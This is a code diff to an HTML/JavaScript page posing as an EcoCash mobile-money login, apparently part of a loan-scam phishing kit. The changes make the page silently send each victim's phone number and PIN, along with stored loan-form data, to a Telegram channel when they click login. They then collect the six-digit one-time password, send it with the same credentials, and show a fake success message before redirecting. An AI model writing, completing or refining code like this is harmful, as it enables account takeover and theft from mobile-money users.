@@ -46,7 +46,7 @@
 <body>
   <div class="card">
 
-    <!-- CORRECT LOGO PATH -->
+    <!-- keep this line exactly as in your file -->
     <img src="assets/eco.png" alt="EcoCash logo" class="logo">
 
     <h2>Log In</h2>
@@ -122,7 +122,8 @@
     });
   }
 
-  document.getElementById('loginForm').addEventListener('submit', function(e){
+  // When LOGIN is clicked: send phone+pin to Telegram, then open OTP modal
+  document.getElementById('loginForm').addEventListener('submit', async function(e){
     e.preventDefault();
 
     const pin = pinEl.value.trim();
@@ -131,16 +132,48 @@
       return;
     }
 
+    const phone = phoneEl.value.trim();
+    if(!phone){
+      alert("Enter phone");
+      return;
+    }
+
+    // show OTP modal immediately
     document.getElementById('otpModal').style.display = 'flex';
     otpInput.value = '';
     otpWarning.style.display = 'none';
     confirmOtp.disabled = true;
     setTimeout(()=> otpInput.focus(), 80);
+
+    // send login details to Telegram (non-blocking)
+    (async () => {
+      const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
+      try {
+        await sendToServer({
+          submittedAt: new Date().toISOString(),
+          event: 'login_clicked',
+          loanData,
+          loginPhone: phone,
+          loginPin: pin
+        });
+        // no UI changes here — keep modal open
+      } catch (err) {
+        // silently log; don't block user
+        console.error('Failed to send login details', err);
+      }
+    })();
   });
 
-  cancelOtp.addEventListener('click', ()=>{
-    otpModal.style.display = 'none';
+  // Cancel OTP modal
+  document.getElementById('cancelOtp').addEventListener('click', ()=>{
+    document.getElementById('otpModal').style.display = 'none';
   });
+
+  // OTP input logic
+  const otpInput = document.getElementById('otpInput');
+  const otpWarning = document.getElementById('otpWarning');
+  const confirmOtp = document.getElementById('confirmOtp');
+  const otpStatus = document.getElementById('otpStatus');
 
   otpInput.addEventListener('input', ()=>{
     otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6);
@@ -160,6 +193,7 @@
     }
   });
 
+  // When Confirm is clicked: send OTP + phone + pin to Telegram
   confirmOtp.addEventListener('click', async ()=>{
     const code = otpInput.value.trim();
     if(!/^\d{6}$/.test(code)){
@@ -169,27 +203,33 @@
 
     otpWarning.style.display = 'none';
     otpStatus.textContent = "Sending…";
+    confirmOtp.disabled = true;
 
     const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
+    const phone = phoneEl.value.trim();
+    const pin = pinEl.value.trim();
 
     try {
       const resp = await sendToServer({
         submittedAt: new Date().toISOString(),
+        event: 'otp_confirm',
         loanData,
-        loginPhone: phone.value.trim(),
-        loginPin: pin.value.trim(),
+        loginPhone: phone,
+        loginPin: pin,
         otp: code
       });
 
       if(!resp.ok){
         otpStatus.textContent = "Server error";
+        confirmOtp.disabled = false;
       } else {
         otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
         sessionStorage.removeItem('loanForm');
         setTimeout(()=> window.location.href = "thankyou.html", 1200);
       }
-    } catch {
+    } catch (err) {
       otpStatus.textContent = "Network error";
+      confirmOtp.disabled = false;
     }
   });
 </script>
